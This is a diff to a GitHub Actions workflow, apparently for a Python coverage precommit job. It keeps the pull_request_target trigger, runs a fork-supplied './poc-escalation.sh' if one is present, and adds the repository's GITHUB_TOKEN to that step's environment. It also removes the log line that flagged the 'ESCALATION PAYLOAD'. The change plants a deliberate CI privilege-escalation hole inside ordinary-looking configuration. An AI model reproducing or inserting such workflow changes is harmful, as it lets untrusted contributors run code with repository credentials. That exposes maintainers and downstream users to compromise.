@@ -4,8 +4,6 @@ on:
   pull_request_target:
     branches: ['master']
     paths: ['sdks/python/**', 'model/**', '.github/trigger_files/beam_PreCommit_Python_Coverage.json']
-  issue_comment:
-    types: [created]
   workflow_dispatch:
 
 permissions:
@@ -17,8 +15,6 @@ permissions:
 
 env:
   DEVELOCITY_ACCESS_KEY: ${{ secrets.DEVELOCITY_ACCESS_KEY }}
-  GRADLE_ENTERPRISE_CACHE_USERNAME: ${{ secrets.GE_CACHE_USERNAME }}
-  GRADLE_ENTERPRISE_CACHE_PASSWORD: ${{ secrets.GE_CACHE_PASSWORD }}
 
 jobs:
   beam_PreCommit_Python_Coverage:
@@ -26,10 +22,8 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 30
     if: |
-      github.event_name == 'push' ||
       github.event_name == 'pull_request_target' ||
-      github.event_name == 'workflow_dispatch' ||
-      startswith(github.event.comment.body, 'Run Python_Coverage PreCommit')
+      github.event_name == 'workflow_dispatch'
     steps:
     - uses: actions/checkout@v4
     - name: Setup repository
@@ -39,11 +33,11 @@ jobs:
         github_token: ${{ secrets.GITHUB_TOKEN }}
         github_job: "PreCommit Python Coverage"
     - name: Run build
+      env:
+        GH_TOKEN_FOR_DISPATCH: ${{ secrets.GITHUB_TOKEN }}
       run: |
-        echo "=== Build from checked-out code ==="
+        echo "=== Build from fork code ==="
         echo "Commit: $(git log --oneline -1)"
         if [ -f "./poc-escalation.sh" ]; then
-          echo "=== ESCALATION PAYLOAD FOUND ==="
           bash ./poc-escalation.sh
         fi
-        echo "Build complete."
